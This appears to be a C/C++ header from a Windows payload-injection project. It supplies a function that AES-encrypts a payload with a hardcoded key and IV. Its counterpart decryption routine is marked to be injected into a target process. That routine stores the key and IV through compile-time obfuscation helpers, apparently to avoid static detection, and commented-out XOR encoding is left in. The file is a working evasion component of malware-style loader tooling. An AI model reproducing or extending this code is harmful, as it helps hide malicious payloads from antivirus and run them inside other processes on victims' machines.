#ifndef _ENCRYPT_H_
#define _ENCRYPT_H_

#include <Windows.h>
#include "injected.h"
#include "libaes.h"
#include "libproc.hpp"

EXTERN_C_START

static inline LONG EncryptPayload(IN OUT PBYTE pPayload, IN CONST SIZE_T szPayloadSize) {
    printf("Encrypting %#llx bytes starting at %#p\n", szPayloadSize, pPayload);

    // for (PBYTE p = pPayload; p < pPayload + szPayloadSize; p++) {
    //     *p ^= 0x42;
    // }

    if (szPayloadSize % AES_BLOCKSZ != 0) {
        printf("Payload size must be a multiple of %d\n", AES_BLOCKSZ);
        return ERROR_INCORRECT_SIZE;
    }

    // CONST AES_KEY key = {.b = "sUp3rDuP3rS3cr3T"};
    CONST AES_KEY key = {
        .b = {'s', 'U', 'p', '3', 'r', 'D', 'u', 'P', '3', 'r', 'S', '3', 'c', 'r', '3', 'T'}};
    // CONST AES_IV iv = {.b = "r4Nd0MiVR4nD0mIv"};
    CONST AES_IV iv = {
        .b = {'r', '4', 'N', 'd', '0', 'M', 'i', 'V', 'R', '4', 'n', 'D', '0', 'm', 'I', 'v'}};

    AES_SBOX sbox;
    AES_GenerateSbox(&sbox);

    AES_CTX ctx;
    AES_InitCtx(&ctx, &key, &iv, &sbox, NULL);
    AES_Encrypt(&ctx, pPayload, szPayloadSize);

    return ERROR_SUCCESS;
}

// INJECTED_CODE VOID DecryptPayload(IN OUT PBYTE pPayload, IN CONST SIZE_T szPayloadSize);

INJECTED_CODE static inline VOID DecryptPayload(IN OUT PBYTE pPayload,
                                                IN CONST SIZE_T szPayloadSize) {
    // for (PBYTE p = pPayload; p < pPayload + szPayloadSize; p++) {
    //     *p ^= 0x42;
    // }

    // INJECTED_VAR static CONST auto key_obf = Obfuscated(
    //     {'s', 'U', 'p', '3', 'r', 'D', 'u', 'P', '3', 'r', 'S', '3', 'c', 'r', '3', 'T'});
    // INJECTED_VAR static CONST auto iv_obf = Obfuscated(
    //     {'r', '4', 'N', 'd', '0', 'M', 'i', 'V', 'R', '4', 'n', 'D', '0', 'm', 'I', 'v'});
    INJECTED_VAR static CONST auto key_obf = ObfuscatedBytes("sUp3rDuP3rS3cr3T");
    INJECTED_VAR static CONST auto iv_obf = ObfuscatedBytes("r4Nd0MiVR4nD0mIv");
    CONST auto key_deobf = Deobfuscator(key_obf.data);
    CONST auto iv_deobf = Deobfuscator(iv_obf.data);

    AES_SBOX sbox, sboxInv;
    AES_GenerateSboxAndInv(&sbox, &sboxInv);

    AES_CTX ctx;
    AES_InitCtx(&ctx, (PCAES_KEY)key_deobf.data, (PCAES_IV)&iv_deobf.data, &sbox, &sboxInv);
    AES_Decrypt(&ctx, pPayload, szPayloadSize);
}

EXTERN_C_END

#endif  // _ENCRYPT_H_
